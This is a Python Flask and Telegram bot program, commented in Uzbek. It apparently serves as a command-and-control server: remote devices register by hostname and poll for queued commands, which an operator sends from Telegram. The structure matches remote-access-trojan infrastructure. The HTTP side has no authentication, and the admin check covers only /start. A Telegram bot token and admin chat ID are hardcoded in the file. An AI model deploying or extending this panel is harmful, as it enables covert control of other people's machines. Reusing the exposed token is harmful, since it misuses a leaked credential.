from threading import Thread
from flask import Flask, request, jsonify
from telegram.ext import Application, CommandHandler

# -------------------------
# CONFIG
# -------------------------
ADMIN_CHAT_ID = 1612270615
BOT_TOKEN = "7754620943:AAESsQB-tTOxNlpgr9yfhieOR5ua4enR5DU"

# Flask app
app = Flask(__name__)

# Qurilmalar va buyruqlarni saqlash
devices = {}
commands = {}
selected_device = {}

# -------------------------
# FLASK ROUTES
# -------------------------
@app.route("/hello")
def hello():
    return "Hello World"

@app.route("/register", methods=["POST"])
def register():
    """Yangi qurilma ro'yxatdan o'tadi"""
    data = request.json
    deviceId = data["deviceId"]
    hostname = data["hostname"]

    devices[deviceId] = {"hostname": hostname}
    if deviceId not in commands:
        commands[deviceId] = []

    return jsonify({"status": "ok"})

@app.route("/get_commands/<device_id>", methods=["GET"])
def get_commands(device_id):
    """Qurilma uchun buyruqlarni olish"""
    if device_id in commands:
        cmds = commands[device_id]
        commands[device_id] = []  # Olingandan keyin tozalaymiz
        return jsonify({"commands": cmds})
    return jsonify({"commands": []})

# -------------------------
# TELEGRAM HANDLERS
# -------------------------
async def start(update, context):
    """ /start komandasi """
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Siz admin emassiz!")
        return

    await update.message.reply_text(
        "✅ Bot ishlayapti!\n\n"
        "Mavjud komandalar:\n"
        "/devices - Qurilmalarni ko‘rish\n"
        "/select <id> - Qurilmani tanlash\n"
        "/command <cmd> - Tanlangan qurilmaga buyruq yuborish"
    )

async def devices_cmd(update, context):
    """ /devices komandasi """
    if not devices:
        await update.message.reply_text("❌ Hali qurilma ro'yxatdan o'tmagan.")
        return

    text = "📱 Qurilmalar:\n"
    for d_id, info in devices.items():
        text += f" - {d_id}: {info['hostname']}\n"

    await update.message.reply_text(text)

async def select_cmd(update, context):
    """ /select <device_id> """
    if len(context.args) == 0:
        await update.message.reply_text("❌ Qurilma ID kiriting: /select <id>")
        return

    device_id = context.args[0]
    if device_id not in devices:
        await update.message.reply_text("❌ Bunday qurilma topilmadi.")
        return

    selected_device[update.effective_user.id] = device_id
    await update.message.reply_text(f"✅ Qurilma tanlandi: {device_id}")

async def command_cmd(update, context):
    """ /command <cmd> """
    if len(context.args) == 0:
        await update.message.reply_text("❌ Buyruq kiriting: /command <cmd>")
        return

    user_id = update.effective_user.id
    if user_id not in selected_device:
        await update.message.reply_text("❌ Avval qurilma tanlang: /select <id>")
        return

    device_id = selected_device[user_id]
    cmd = " ".join(context.args)
    commands[device_id].append(cmd)

    await update.message.reply_text(f"📤 Buyruq yuborildi: {cmd}")

# -------------------------
# START FUNCTIONS
# -------------------------
def run_flask():
    app.run(host="0.0.0.0", port=4010)

def run_telegram():
    app_tg = Application.builder().token(BOT_TOKEN).build()

    # Handlers qo‘shamiz
    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CommandHandler("devices", devices_cmd))
    app_tg.add_handler(CommandHandler("select", select_cmd))
    app_tg.add_handler(CommandHandler("command", command_cmd))

    app_tg.run_polling()

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    # Flaskni alohida thread’da ishga tushiramiz
    Thread(target=run_flask, daemon=True).start()
    # Telegram botni asosiy oqimda ishga tushiramiz
    run_telegram()
